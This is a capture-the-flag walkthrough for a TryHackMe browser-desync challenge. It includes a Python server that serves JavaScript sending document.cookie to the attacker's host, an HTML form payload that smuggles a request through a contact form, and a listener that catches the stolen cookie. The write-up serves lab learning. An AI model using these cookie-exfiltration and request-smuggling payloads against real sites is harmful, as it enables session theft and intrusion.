# Browser Desync Attack – TryHackMe Challenge Walkthrough

This repository contains a step-by-step guide to solving the **Browser Desync** challenge on TryHackMe.

## 🧠 Objective

Exploit a vulnerable web server using a browser-based desynchronization attack to extract a flag via a crafted payload and a local server.

---

## 🛠 Prerequisites

- Linux environment or TryHackMe AttackBox
- Python 3
- Basic knowledge of HTML/JavaScript
- Modify `/etc/hosts` file

---

## ✅ Exact Steps to Complete the Challenge

### 1. Edit `/etc/hosts`

Add the following entry to your `/etc/hosts` file:

```bash
sudo nano /etc/hosts
```
```
10.10.98.237 challenge.thm
```

### 2. Start the Payload Server (Port 1337)
Create a file named server.py with the following content:

```python

from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"fetch('http://YOUR_IP:8080/' + document.cookie)")

def run_server(port=1337):   
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

Replace YOUR_IP with your real IP (e.g., 10.8.9.123), then run:

```bash
sudo python3 server.py
```

### 3. Start a Web Server on Port 8080
In a new terminal:

```bash
sudo python3 -m http.server 8080
```
This will serve static content and allow receiving the stolen cookie/flag via the crafted request.

### 4. Inject the Payload via Secure Contact Page
Visit:

http://challenge.thm/securecontact
Fill in the form. In the message field, paste the following payload:
``` 
<form id="btn" action="http://challenge.thm/" method="POST" enctype="text/plain">
<textarea name="GET http://YOUR_IP:1337 HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```
Replace YOUR_IP with your real IP.

### 5. Trigger the Payload Execution
Now visit:

http://challenge.thm/vulnerablecontact
This page will parse and execute the HTML/JavaScript code, causing the browser to submit the form and initiate the request smuggling.

### 6. Receive the Flag
Wait for a request to hit your server on port 8080. You should see something like:


GET /flag=THM{...} HTTP/1.1

🎉 Flag captured!

🧩 Notes
This challenge exploits how HTTP/1.1 and browser behavior can desynchronize front-end and back-end servers.

The vulnerability chain involves reflection, request smuggling, and CORS misconfigurations.

Ensure your IP and port are accessible by the target during testing.
